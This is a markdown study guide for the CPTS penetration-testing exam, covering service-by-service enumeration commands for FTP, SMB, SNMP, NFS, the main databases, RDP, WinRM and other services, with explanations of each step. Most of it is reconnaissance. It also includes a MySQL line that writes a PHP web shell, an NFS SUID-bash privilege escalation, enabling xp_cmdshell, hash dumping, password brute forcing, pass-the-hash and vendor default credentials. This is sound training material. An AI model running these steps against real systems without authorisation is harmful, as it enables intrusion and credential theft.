# Complete Service Enumeration Guide - All Services

## 📋 Overview

This comprehensive guide covers enumeration techniques for ALL common services you'll encounter during CPTS exam. Each command includes detailed explanations of what it does and why.

---

## 🎯 Quick Service Reference

| Port(s) | Service | Priority | Quick Check Command |
|---------|---------|----------|---------------------|
| 21 | FTP | HIGH | `ftp $IP` (try anonymous:anonymous) |
| 22 | SSH | MEDIUM | `ssh user@$IP` |
| 23 | Telnet | MEDIUM | `telnet $IP` |
| 25 | SMTP | MEDIUM | `telnet $IP 25` |
| 53 | DNS | HIGH | `dig axfr @$IP domain.htb` |
| 80/443 | HTTP/HTTPS | CRITICAL | `curl -I http://$IP` |
| 110/995 | POP3/POP3S | LOW | `telnet $IP 110` |
| 111/2049 | NFS | HIGH | `showmount -e $IP` |
| 135 | MSRPC/WMI | MEDIUM | `rpcdump.py $IP` |
| 139/445 | SMB | CRITICAL | `smbclient -N -L //$IP` |
| 143/993 | IMAP/IMAPS | LOW | `telnet $IP 143` |
| 161 | SNMP | HIGH | `snmpwalk -v2c -c public $IP` |
| 389/636 | LDAP/LDAPS | HIGH | `ldapsearch -x -H ldap://$IP` |
| 512-514 | R-Services | LOW | `rlogin $IP` |
| 873 | Rsync | MEDIUM | `rsync -av --list-only rsync://$IP` |
| 1433 | MSSQL | HIGH | `impacket-mssqlclient sa@$IP` |
| 1521 | Oracle TNS | MEDIUM | `sqlplus user/pass@$IP/SID` |
| 3306 | MySQL | HIGH | `mysql -u root -h $IP` |
| 3389 | RDP | HIGH | `xfreerdp /u:user /p:pass /v:$IP` |
| 5432 | PostgreSQL | MEDIUM | `psql -h $IP -U postgres` |
| 5985/5986 | WinRM | HIGH | `evil-winrm -i $IP -u user -p pass` |
| 623 | IPMI | MEDIUM | `ipmitool -I lanplus -H $IP -U admin` |

---

## 🔍 FTP (Port 21)

### What is FTP?
File Transfer Protocol - Used for transferring files between client and server

### Initial Enumeration
```bash
# Nmap scan with version detection and default scripts
sudo nmap -p21 -sV -sC $IP

# What this does:
# -p21: Scan only port 21
# -sV: Detect service version
# -sC: Run default NSE scripts (checks for anonymous login, etc.)
```

### Anonymous Login Test
```bash
# Try anonymous FTP access
ftp $IP
# Username: anonymous
# Password: anonymous (or just press Enter)

# What this does:
# Attempts to log in without credentials
# Many FTP servers allow anonymous access for public files
```

### Download All Files
```bash
# Recursively download all accessible files
wget -m --no-passive ftp://anonymous:anonymous@$IP

# What this does:
# -m: Mirror (recursive download)
# --no-passive: Use active FTP mode (better for firewalls)
# Downloads entire FTP directory structure
```

### Manual FTP Commands
```bash
# Connect and enumerate
ftp $IP
ftp> ls                    # List files in current directory
ftp> cd directory          # Change directory
ftp> get filename          # Download single file
ftp> mget *                # Download multiple files
ftp> put filename          # Upload file (if writable)
ftp> binary                # Switch to binary mode (for executables)
ftp> ascii                 # Switch to ASCII mode (for text files)
ftp> pwd                   # Print working directory
ftp> bye                   # Exit FTP session
```

### Brute Force FTP
```bash
# Brute force FTP credentials
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$IP

# What this does:
# -l admin: Try username 'admin'
# -P: Use password list
# Attempts to crack FTP credentials
```

### NSE Scripts for FTP
```bash
# Run all FTP-related NSE scripts
nmap -p21 --script ftp-* $IP

# Useful scripts:
# ftp-anon: Check for anonymous login
# ftp-bounce: Test for FTP bounce attack
# ftp-syst: Get system type
# ftp-vuln-cve2010-4221: Check for specific vulnerability
```

---

## 🔐 SSH (Port 22)

### What is SSH?
Secure Shell - Encrypted remote access protocol

### Initial Enumeration
```bash
# Banner grabbing
nc -nv $IP 22

# What this does:
# Connects to SSH port and displays banner
# Banner reveals SSH version and OS information
```

### SSH Version Detection
```bash
# Detailed SSH enumeration
nmap -p22 --script ssh-hostkey,ssh-auth-methods $IP

# What this does:
# ssh-hostkey: Retrieves SSH host keys
# ssh-auth-methods: Lists supported authentication methods
```

### SSH Audit
```bash
# Comprehensive SSH security audit
git clone https://github.com/jtesta/ssh-audit.git
cd ssh-audit
./ssh-audit.py $IP

# What this does:
# Checks for weak algorithms
# Identifies security vulnerabilities
# Lists supported ciphers and key exchanges
```

### SSH Login Attempts
```bash
# Try default credentials
ssh root@$IP
ssh admin@$IP
ssh user@$IP

# With specific authentication method
ssh -v user@$IP -o PreferredAuthentications=password

# What this does:
# -v: Verbose mode (shows authentication process)
# -o: Specifies authentication method to use
```

### SSH Key-Based Authentication
```bash
# If you find an SSH private key
chmod 600 id_rsa                    # Set correct permissions
ssh -i id_rsa user@$IP              # Connect using private key

# What this does:
# chmod 600: Makes key readable only by owner (required)
# -i: Specifies identity file (private key)
```

---

## 📧 SMTP (Port 25)

### What is SMTP?
Simple Mail Transfer Protocol - Used for sending emails

### Initial Enumeration
```bash
# Connect to SMTP server
telnet $IP 25

# What this does:
# Opens interactive connection to SMTP server
# Allows manual SMTP command execution
```

### SMTP Commands
```bash
# After connecting with telnet
HELO attacker.com          # Identify yourself to server
VRFY root                  # Verify if user 'root' exists
VRFY admin                 # Verify if user 'admin' exists
EXPN root                  # Expand mailing list
RCPT TO:user@domain.com    # Specify recipient (another enum method)

# What these do:
# VRFY: Checks if username exists (user enumeration)
# EXPN: Shows members of mailing list
# RCPT TO: Can reveal valid email addresses
```

### User Enumeration
```bash
# Automated user enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $IP

# What this does:
# -M VRFY: Use VRFY command for enumeration
# -U: Specify username wordlist
# -t: Target IP
# Automatically tests each username
```

### NSE Scripts
```bash
# SMTP enumeration with Nmap
nmap -p25 --script smtp-enum-users,smtp-commands,smtp-open-relay $IP

# What these scripts do:
# smtp-enum-users: Attempts user enumeration
# smtp-commands: Lists supported SMTP commands
# smtp-open-relay: Tests if server is an open relay (security issue)
```

---

## 🌐 DNS (Port 53)

### What is DNS?
Domain Name System - Translates domain names to IP addresses

### Zone Transfer Attempt
```bash
# Try to perform zone transfer (AXFR)
dig axfr @$IP domain.htb

# What this does:
# axfr: Requests full zone transfer
# @$IP: Specifies DNS server
# domain.htb: Domain to transfer
# If successful, reveals all DNS records (subdomains, IPs, etc.)
```

### Alternative Zone Transfer
```bash
# Using host command
host -l domain.htb $IP

# What this does:
# -l: List all hosts in domain (zone transfer)
# Same as dig axfr but different tool
```

### DNS Enumeration
```bash
# Query specific record types
dig @$IP domain.htb A          # IPv4 address
dig @$IP domain.htb AAAA       # IPv6 address
dig @$IP domain.htb MX         # Mail servers
dig @$IP domain.htb NS         # Name servers
dig @$IP domain.htb TXT        # Text records
dig @$IP domain.htb ANY        # All records

# What this does:
# Queries different DNS record types
# Reveals infrastructure information
```

### Subdomain Brute Force
```bash
# Manual subdomain brute forcing
for sub in $(cat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt); do 
    dig $sub.domain.htb @$IP | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt
done

# What this does:
# Loops through subdomain wordlist
# Tests each subdomain against DNS server
# Saves valid subdomains to file
```

### DNSenum
```bash
# Automated DNS enumeration
dnsenum --dnsserver $IP --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt domain.htb

# What this does:
# --dnsserver: Specifies DNS server
# --enum: Enable enumeration
# -p 0: No pause between requests
# -s 0: No scraping
# -o: Output file
# -f: Subdomain wordlist
```

---

## 📁 SMB (Ports 139/445)

### What is SMB?
Server Message Block - File sharing protocol (primarily Windows)

**See detailed guide**: [`SMB-Enumeration.md`](./SMB-Enumeration.md)

### Quick Enumeration
```bash
# List shares (null session)
smbclient -N -L //$IP

# What this does:
# -N: No password
# -L: List shares
# Attempts anonymous connection
```

### Comprehensive Enumeration
```bash
# All-in-one enumeration
enum4linux-ng $IP -A

# What this does:
# -A: All enumeration (users, shares, groups, policies)
# Comprehensive SMB/RPC enumeration tool
```

---

## 📊 SNMP (Port 161 UDP)

### What is SNMP?
Simple Network Management Protocol - Network device management

### Community String Brute Force
```bash
# Brute force SNMP community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt $IP

# What this does:
# -c: Community string wordlist
# Tests common community strings (public, private, etc.)
# Community string = password for SNMP
```

### SNMP Walk
```bash
# Walk through SNMP tree
snmpwalk -v2c -c public $IP

# What this does:
# -v2c: Use SNMP version 2c
# -c public: Use 'public' community string
# Retrieves all SNMP data from device
```

### Specific OID Queries
```bash
# Query specific information
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2      # Running processes
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.6.3.1.2      # Installed software
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.1.6.0        # System processes
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.6.13.1.3        # TCP connections

# What this does:
# OID: Object Identifier (specific data point in SNMP tree)
# Each OID returns different system information
```

### Braa (Fast SNMP Scanner)
```bash
# Fast OID enumeration
braa public@$IP:.1.3.6.*

# What this does:
# Quickly brute forces OIDs
# Faster than snmpwalk for large ranges
```

---

## 📂 NFS (Ports 111/2049)

### What is NFS?
Network File System - File sharing for Unix/Linux

### Show Available Exports
```bash
# List NFS exports
showmount -e $IP

# What this does:
# -e: Show export list
# Displays shared directories and access permissions
```

### Mount NFS Share
```bash
# Create mount point
mkdir /mnt/nfs

# Mount the share
sudo mount -t nfs $IP:/share /mnt/nfs -o nolock

# What this does:
# -t nfs: Specify filesystem type
# -o nolock: Disable file locking (sometimes required)
# Mounts remote NFS share locally
```

### Enumerate Mounted Share
```bash
# List contents with permissions
ls -la /mnt/nfs

# List with UIDs/GUIDs
ls -n /mnt/nfs

# What this does:
# Shows file ownership and permissions
# UIDs/GUIDs help identify privilege escalation opportunities
```

### NFS Privilege Escalation
```bash
# If no_root_squash is enabled:
# On attacker machine (as root):
cp /bin/bash /mnt/nfs/bash
chmod +s /mnt/nfs/bash

# On target machine:
/share/bash -p

# What this does:
# Creates SUID bash binary on NFS share
# no_root_squash allows root access from client
# -p flag preserves privileges
```

---

## 📮 IMAP/POP3 (Ports 110, 143, 993, 995)

### What are IMAP/POP3?
Email retrieval protocols
- IMAP: Access emails on server
- POP3: Download emails to client

### Connect to IMAP
```bash
# Plain text connection
telnet $IP 143

# SSL/TLS connection
openssl s_client -connect $IP:993 -crlf -quiet

# What this does:
# Opens interactive IMAP session
# -crlf: Proper line endings
# -quiet: Suppress SSL handshake details
```

### IMAP Commands
```bash
# After connecting:
a1 LOGIN username password          # Authenticate
a2 LIST "" "*"                      # List all mailboxes
a3 SELECT INBOX                     # Select mailbox
a4 FETCH 1 RFC822                   # Fetch email #1
a5 LOGOUT                           # Disconnect

# What these do:
# LOGIN: Authenticate to mail server
# LIST: Show available mailboxes
# SELECT: Open specific mailbox
# FETCH: Retrieve email content
```

### Connect to POP3
```bash
# Plain text connection
telnet $IP 110

# SSL/TLS connection
openssl s_client -connect $IP:995

# What this does:
# Opens interactive POP3 session
```

### POP3 Commands
```bash
# After connecting:
USER username                       # Specify username
PASS password                       # Provide password
STAT                                # Get mailbox statistics
LIST                                # List all messages
RETR 1                              # Retrieve message #1
DELE 1                              # Delete message #1
QUIT                                # Disconnect

# What these do:
# USER/PASS: Authentication
# STAT: Shows number of messages
# LIST: Lists message IDs and sizes
# RETR: Downloads specific message
```

---

## 🗄️ MySQL (Port 3306)

### What is MySQL?
Open-source relational database

### Initial Connection
```bash
# Try default credentials
mysql -u root -h $IP                # No password
mysql -u root -p -h $IP             # Prompt for password
mysql -u admin -p -h $IP            # Try admin user

# What this does:
# -u: Specify username
# -p: Prompt for password
# -h: Specify host
```

### MySQL Enumeration
```bash
# Nmap MySQL scripts
nmap -p3306 --script mysql-enum,mysql-info,mysql-databases,mysql-variables $IP

# What these scripts do:
# mysql-enum: Enumerate MySQL users
# mysql-info: Get MySQL version and info
# mysql-databases: List databases
# mysql-variables: Show configuration variables
```

### MySQL Commands
```bash
# After successful login:
SHOW DATABASES;                     # List all databases
USE database_name;                  # Select database
SHOW TABLES;                        # List tables in database
DESCRIBE table_name;                # Show table structure
SELECT * FROM table_name;           # View table contents
SELECT user,password FROM mysql.user;  # Dump user hashes

# What these do:
# Navigate database structure
# Extract sensitive data
# Dump credentials
```

### MySQL File Operations
```bash
# Read files (if FILE privilege exists)
SELECT LOAD_FILE('/etc/passwd');

# Write files (if FILE privilege exists)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# What this does:
# LOAD_FILE: Read system files
# INTO OUTFILE: Write files (web shell upload)
```

---

## 🗄️ MSSQL (Port 1433)

### What is MSSQL?
Microsoft SQL Server

### Connect with Impacket
```bash
# Connect to MSSQL
impacket-mssqlclient sa:password@$IP -windows-auth

# What this does:
# sa: System Administrator account
# -windows-auth: Use Windows authentication
```

### MSSQL Enumeration
```bash
# Nmap MSSQL scripts
nmap -p1433 --script ms-sql-info,ms-sql-config,ms-sql-dump-hashes $IP

# What these scripts do:
# ms-sql-info: Get MSSQL version and info
# ms-sql-config: Show configuration
# ms-sql-dump-hashes: Extract password hashes
```

### xp_cmdshell Exploitation
```bash
# After connecting:
SQL> EXEC sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> xp_cmdshell 'whoami';

# What this does:
# Enables xp_cmdshell (command execution)
# Allows running OS commands from SQL
# Major privilege escalation vector
```

---

## 🔮 Oracle TNS (Port 1521)

### What is Oracle TNS?
Oracle database communication protocol

### SID Brute Force
```bash
# Brute force Oracle SIDs
nmap -p1521 --script oracle-sid-brute $IP

# What this does:
# SID: System Identifier (database instance name)
# Brute forces common SID names
```

### ODAT Enumeration
```bash
# Comprehensive Oracle enumeration
./odat.py all -s $IP

# What this does:
# Tests all ODAT modules
# Enumerates users, SIDs, privileges
# Checks for vulnerabilities
```

### SQLplus Connection
```bash
# Connect to Oracle database
sqlplus scott/tiger@$IP/XE

# Try as SYSDBA (admin)
sqlplus scott/tiger@$IP/XE as sysdba

# What this does:
# scott/tiger: Common default credentials
# XE: Common SID name
# as sysdba: Attempt privileged connection
```

### Extract Password Hashes
```bash
# After connecting as SYSDBA:
SQL> SELECT name, password FROM sys.user$;

# What this does:
# Dumps Oracle user password hashes
# Can be cracked offline
```

---

## 🔧 IPMI (Port 623 UDP)

### What is IPMI?
Intelligent Platform Management Interface - Hardware management

### Version Detection
```bash
# Nmap IPMI version scan
nmap -sU -p623 --script ipmi-version $IP

# What this does:
# -sU: UDP scan
# Detects IPMI version and capabilities
```

### Dump Hashes
```bash
# Metasploit hash dumping
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS $IP
run

# What this does:
# Exploits IPMI vulnerability
# Dumps password hashes
# Hashes can be cracked offline
```

### Default Credentials
```
Dell iDRAC: root / calvin
HP iLO: Administrator / (random 8-char)
Supermicro: ADMIN / ADMIN
```

---

## 🖥️ RDP (Port 3389)

### What is RDP?
Remote Desktop Protocol - Windows remote access

### RDP Enumeration
```bash
# Nmap RDP scripts
nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption $IP

# What these scripts do:
# rdp-ntlm-info: Get system information
# rdp-enum-encryption: Check encryption levels
```

### RDP Security Check
```bash
# Comprehensive RDP security audit
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
cd rdp-sec-check
./rdp-sec-check.pl $IP

# What this does:
# Checks for security vulnerabilities
# Tests encryption strength
# Identifies potential exploits
```

### Connect to RDP
```bash
# Basic connection
xfreerdp /u:username /p:password /v:$IP

# With certificate ignore
xfreerdp /u:username /p:password /v:$IP /cert:ignore

# Optimized for slow connections
xfreerdp /u:username /p:password /v:$IP /cert:ignore /bpp:8 /network:modem /compression -themes -wallpaper

# What these options do:
# /cert:ignore: Ignore certificate warnings
# /bpp:8: Lower color depth (faster)
# /network:modem: Optimize for slow connection
# /compression: Enable compression
# -themes -wallpaper: Disable visual effects
```

---

## 🔐 WinRM (Ports 5985/5986)

### What is WinRM?
Windows Remote Management - PowerShell remoting

### WinRM Enumeration
```bash
# Nmap WinRM detection
nmap -p5985,5986 -sV $IP

# What this does:
# Detects WinRM service
# 5985: HTTP
# 5986: HTTPS
```

### Evil-WinRM Connection
```bash
# Connect with credentials
evil-winrm -i $IP -u username -p password

# Connect with hash (Pass-the-Hash)
evil-winrm -i $IP -u username -H NTHASH

# What this does:
# Establishes PowerShell session
# -H: Use NTLM hash instead of password
```

### CrackMapExec WinRM
```bash
# Test WinRM access
crackmapexec winrm $IP -u username -p password

# What this does:
# Validates WinRM credentials
# Shows if user has admin access
```

---

## 🔄 Rsync (Port 873)

### What is Rsync?
Fast file synchronization tool

### List Shares
```bash
# Connect and list shares
nc -nv $IP 873

# List specific share
rsync -av --list-only rsync://$IP/share

# What this does:
# -av: Archive mode, verbose
# --list-only: Don't download, just list
```

### Download Files
```bash
# Sync all files from share
rsync -av rsync://$IP/share ./local_dir

# What this does:
# Downloads entire share contents
# Preserves permissions and timestamps
```

---

## 🔧 R-Services (Ports 512-514)

### What are R-Services?
Legacy Unix remote access (rlogin, rsh, rexec)

### Enumerate R-Services
```bash
# Scan for R-Services
nmap -p512,513,514 -sV $IP

# What this does:
# 512: rexec
# 513: rlogin
# 514: rsh
```

### Rlogin Connection
```bash
# Attempt rlogin
rlogin $IP -l username

# What this does:
# Attempts remote login
# Often allows access without password if trusted
```

### List Users
```bash
# Show logged in users
rwho
rusers -al $IP

# What this does:
# rwho: Shows who is logged in
# rusers: More detailed user information
```

---

## 💡 Pro Tips for Service Enumeration

### 1. Always Start with Nmap
```bash
# Comprehensive initial scan
sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $IP -oA nmap/allports
```

### 2. Use Service-Specific Tools
```bash
# Don't rely only on Nmap
# Use specialized tools for each service
```

### 3. Check for Default Credentials
```bash
# Always try common defaults first
# admin:admin, root:root, admin:password
```

### 4. Document Everything
```bash
# Save all output
command | tee output.txt
```

### 5. Read Error Messages
```bash
# Error messages reveal information
# "Access denied" vs "User not found"
```

---

## 📚 Related Resources

- [Nmap Reference](../../08-Tools-Reference/Nmap.md)
- [SMB Enumeration](./SMB-Enumeration.md)
- [Web Enumeration](../Web-Enumeration/Web-Recon-Workflow.md)
- [Quick Reference](../../09-Quick-Reference/Exam-Checklist.md)

---

**Remember**: Systematic enumeration finds more vulnerabilities than random testing!
